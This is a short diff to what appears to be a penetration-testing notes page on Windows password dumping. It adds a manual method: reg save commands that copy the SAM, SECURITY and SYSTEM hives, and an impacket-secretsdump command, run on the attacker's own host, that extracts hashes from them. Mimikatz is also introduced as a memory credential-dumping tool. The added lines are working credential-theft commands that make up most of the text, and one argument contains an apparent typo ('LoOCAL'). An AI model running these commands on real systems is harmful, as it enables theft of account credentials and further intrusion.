@@ -6,6 +6,20 @@ description: >-
 
 # Password Dumping
 
+## Manual
+
+```text
+reg save hklm\sam c:\temp\sam.save
+reg save hklm\security c:\temp\security.save
+reg save hklm\system c:\temp\system.save
+```
+
+on our own host:
+
+```text
+impacket-secretsdump -sam sam.save -security security.save -system system.save LoOCAL
+```
+
 ## Mimikatz
 
 Mimikatz is a leading post-exploitation tool that dumps passwords from memory, as well as hashes, PINs and Kerberos tickets.
